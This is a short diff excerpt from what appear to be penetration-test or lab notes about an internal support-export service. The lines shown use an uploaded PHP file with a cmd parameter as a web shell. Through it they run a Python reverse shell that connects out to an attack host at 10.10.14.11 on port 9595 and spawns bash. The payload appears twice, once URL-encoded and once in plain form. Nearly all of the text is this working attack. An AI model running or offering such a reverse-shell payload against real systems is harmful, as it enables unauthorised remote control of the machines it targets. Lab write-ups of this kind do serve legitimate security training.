@@ -43,5 +43,7 @@ curl -s -X POST 'http://uat01-eu.intranet.trilocor.local/support/export/1' \
 
 
 used this new capability to spawn a new shell on attack host:
+
 http://uat01-eu.intranet.trilocor.local//exports//tickets_2_20240419160800_54e6dd60_43c9_4366_9b89_4a94c12b59a2.json.php?cmd=export%20RHOST=%2210.10.14.11%22;export%20RPORT=9595;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22/bin/bash%22)%27
+
  payload: export RHOST="10.10.14.11";export RPORT=9595;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
